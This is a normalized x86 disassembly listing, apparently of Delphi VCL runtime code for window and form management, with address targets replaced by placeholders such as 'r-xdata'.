and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b390
call sub_44c488
mov ebx eax
sub_451d10
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_451d68
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451dc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_451dd4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403324
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451e00
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_455584
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403324
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_451fa0
jmp r-xdata
mov eax ebx
call sub_45203c
mov dl 0x1
mov eax ebx
call sub_44fb8c
jmp r-xdata
sub_451ea4
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_44f518
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_44f564
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_451f08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451f74
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403324
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45203c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451fc0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45202e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452035
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_450818
sub_452058
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452320
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_433414
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4544f8
xor edx edx
push ebp
push sub_452303
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413934
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_453528
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44c338
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4522e1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_451fa8
xor edx edx
push ebp
push sub_452240
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451f08
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_455304
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43b390
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452247
mov eax [ ebp - 0x4 ]
call sub_451fa0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_452247
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4522eb
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453528
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_453528
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4138b0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4139fc
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44c3ec
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_452330
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452330
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438084
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_4523a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_452330
pop ecx
mov eax [ esi + 0x34 ]
call sub_446e4c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_446e5c
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_452424
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4396e0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403324
sub_452448
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_452478
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452448
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452478
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4524f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_452448
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_452448
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_452478
pop ecx
test al al
je r-xdata
sub_452548
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_452578
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452548
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452578
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4525f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_452548
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_452548
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_452578
pop ecx
test al al
je r-xdata
sub_452648
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4138b8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_440fdc
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45269c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_452648
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403324
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452718
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419a00
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_452754
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_435098
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_435d5c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45279c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43b390
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43b390
push eax
call RedrawWindow
sub_4528f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44d5a8
mov dl 0x5
mov eax ebx
call sub_44f414
mov dl 0x1
mov eax ebx
call sub_439f6c
mov dl 0x3
mov eax ebx
call sub_44f710
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_452958
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_452a2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_439e2c
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_439c98
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_4340c8
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434b28
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403f68
mov eax [ ebp - 0xc ]
call sub_404138
push eax
mov eax [ ebp - 0xc ]
call sub_404338
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_434b38
mov eax [ ebp - 0xc ]
call sub_404138
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452a36
lea eax [ ebp - 0xc ]
call sub_403e78
retn
mov dl 0x1
mov eax esi
call sub_44ea94
mov edx [ ebp - 0xc ]
mov eax esi
call sub_434be4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4044c4
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_452a5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4380c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44e1b8
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_438084
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403324
inc ebp
dec edi
jne r-xdata
sub_452aa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_439e2c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_452ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a634
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_452afc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_450e64
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_439e2c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b390
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_439e40
or ecx 0xffffffff
mov dl 0x1
call sub_435250
pop esi
pop ebx
retn
sub_452b94
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43aaa4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_435d5c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_434554
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403324
sub_452bec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_452cb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_434b28
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403f68
mov eax [ ebp - 0x4 ]
call sub_404138
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_434b38
mov eax [ ebp - 0x4 ]
call sub_404138
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_434be4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452cb9
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_44ea94
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_452cd8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43a824
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_439e2c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_439e40
mov dl [ ebx + 0x57 ]
call sub_434ad4
inc edi
dec esi
jne r-xdata
sub_452d7c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_452dac
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_452ddc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419270
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_453180
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45318c
mov eax ebx
call sub_453198
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_44f5b4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4535b8
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_453494
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_453494
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_453494
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_452f34
push ebx
push esi
push edi
push ebp
call sub_4034b4
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403128
mov eax [ ebp + 0x88 ]
call sub_403128
mov eax [ ebp + 0x84 ]
call sub_403128
mov eax [ ebp + 0x54 ]
call sub_403128
mov eax [ ebp + 0x50 ]
call sub_403128
mov eax [ ebp + 0x4c ]
call sub_403128
mov eax [ ebp + 0x30 ]
call sub_403128
mov eax [ ebp + 0x34 ]
call sub_403128
mov eax [ ebp + 0x7c ]
call sub_403128
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403128
mov eax ebp
call sub_4531f4
mov eax [ rw-data ]
xor edx edx
